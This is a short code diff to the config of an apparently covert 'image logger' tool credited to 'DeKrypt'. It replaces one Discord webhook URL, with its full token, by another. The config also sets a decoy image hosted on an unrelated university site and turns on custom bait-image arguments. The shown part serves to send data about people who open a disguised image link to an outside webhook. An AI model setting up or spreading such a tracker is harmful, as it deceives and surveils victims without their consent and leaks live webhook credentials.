@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1396947107361067079/eRzEu8ylhYsuLEYW9W7NVmiU_AA57f0-XBhtHqdB4GFdBIiPW_-1yTpDbEHfllQq8R6y",
+    "webhook": "https://discord.com/api/webhooks/1398729205218414702/IkXir7uKPiJFm9oUU5Tc3QzuVoeqcJiJGWlW7d6noNusROIVIA4CebUG8W6IL7Jy6xDa",
     "image": "https://ufsb.edu.br/pibid/images/phocagallery/galeria2/thumbs/phoca_thumb_l_image03_grd.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
